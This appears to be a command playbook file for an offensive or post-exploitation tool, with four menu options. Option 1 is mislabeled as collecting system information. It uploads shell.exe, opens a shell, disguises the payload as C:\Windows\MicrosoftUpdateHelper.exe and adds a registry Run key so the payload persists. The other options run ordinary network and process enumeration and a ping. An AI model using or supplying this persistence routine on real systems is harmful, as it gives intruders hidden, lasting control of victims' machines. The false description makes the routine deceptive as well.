### OPTION 1
NAME=REGISTRY RUN KEYS
DESC=Collect basic system information.
VARS=
COMMENT=SENDING PAYLOAD
CMD:upload shell.exe C:/Users
COMMENT:Opening up a shell
CMD:shell
COMMENT=Moving payload to a reliable location
CMD: cd C:\Users
CMD:copy shell.exe C:\Windows\MicrosoftUpdateHelper.exe
COMMENT=Creating a Registry Run Key
CMD:reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "MicrosoftUpdateHelper" /t REG_SZ /d "\"C:\Windows\MicrosoftUpdateHelper.exe\"" /f
### END


### OPTION 2
NAME=Network Information
DESC=Display network configuration and connectivity information.
VARS=
COMMENT=Checking network interfaces
CMD:ip addr
COMMENT=Checking routing table
CMD:ip route
CMD:ss -tuln
### END


### OPTION 3
NAME=Process Information
DESC=Display currently running processes.
VARS=
COMMENT=Listing running processes
CMD:ps aux
COMMENT=Checking process tree
CMD:ps -ef --forest
### END


### OPTION 4
NAME=Custom Command
DESC=Execute a command against a user-supplied target.
VARS=TARGET:Enter target:127.0.0.1
COMMENT=Running the selected command
CMD:ping -c 4 ${TARGET}
### END

